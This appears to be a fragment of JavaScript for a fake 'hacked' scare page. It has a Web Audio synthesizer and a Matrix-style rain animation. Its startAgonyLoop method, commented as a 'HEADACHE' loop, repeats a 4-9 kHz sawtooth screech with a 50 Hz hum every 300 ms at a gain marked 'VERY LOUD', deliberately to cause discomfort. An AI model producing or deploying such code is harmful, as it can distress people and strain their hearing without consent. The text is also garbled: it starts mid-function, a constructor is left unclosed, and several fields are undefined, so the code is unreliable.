        const dir = this.dirs[Math.floor(Math.random() * this.dirs.length)];
        const file = this.files[Math.floor(Math.random() * this.files.length)];

// --- 2. ADVANCED AUDIO ENGINE (Synthesizer) ---
class AudioController {
    constructor() {
        this.ctx = null;
        this.loops = [];
    }

    init() {
        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            this.ctx = new AudioContext();
            // Unlock audio on iOS/Chrome
            const buffer = this.ctx.createBuffer(1, 1, 22050);
            const source = this.ctx.createBufferSource();
            source.buffer = buffer;
            source.connect(this.ctx.destination);
            source.start(0);
        } catch(e) { console.error("Audio init failed"); }
    }

    // High frequency beep
    beep(freq, dur) {
        if (!this.ctx) return;
        const o = this.ctx.createOscillator();
        const g = this.ctx.createGain();
        o.type = 'square';
        o.frequency.value = freq;
        g.gain.value = 0.1;
        o.connect(g); g.connect(this.ctx.destination);
        o.start(); o.stop(this.ctx.currentTime + dur);
    }

    // THE "HEADACHE" LOOP (Binaural Beats + High Pitch)
    startAgonyLoop() {
        if (!this.ctx) return;
        
        const loopId = setInterval(() => {
            const t = this.ctx.currentTime;
            
            // Oscillator 1: High Screech
            const o1 = this.ctx.createOscillator();
            o1.type = 'sawtooth';
            o1.frequency.setValueAtTime(4000, t);
            o1.frequency.linearRampToValueAtTime(9000, t + 0.1); // Glitch up
            
            // Oscillator 2: Uncomfortable Low Hum
            const o2 = this.ctx.createOscillator();
            o2.type = 'sawtooth';
            o2.frequency.setValueAtTime(50, t); // 50hz hum
            
            const g = this.ctx.createGain();
            g.gain.setValueAtTime(2.0, t); // VERY LOUD
            g.gain.exponentialRampToValueAtTime(0.01, t + 0.5);

            o1.connect(g); o2.connect(g); g.connect(this.ctx.destination);
            
            o1.start(); o1.stop(t + 0.5);
            o2.start(); o2.stop(t + 0.5);
        }, 300); // Repeat very fast

        this.loops.push(loopId);
    }
}

// --- 3. GRAPHICS ENGINE (Matrix Rain) ---
class GraphicsCore {
    constructor() {

        this.drops = [];

    resize() {
        this.c.width = window.innerWidth;
        this.c.height = window.innerHeight;
        this.drops = Array(Math.floor(this.c.width / 12)).fill(1);
    }
    render() {
        this.ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
        this.ctx.fillRect(0, 0, this.c.width, this.c.height);
        this.ctx.fillStyle = "#0F0";
        this.ctx.font = "12px monospace";
        for (let i = 0; i < this.drops.length; i++) {
            const text = this.chars[Math.floor(Math.random() * this.chars.length)];
            this.ctx.fillText(text, i * 12, this.drops[i] * 12);
            if (this.drops[i] * 12 > this.c.height && Math.random() > 0.975) {
                this.drops[i] = 0;
            }
            this.drops[i]++;
        }
    }
    start() { setInterval(() => this.render(), 33); }
}
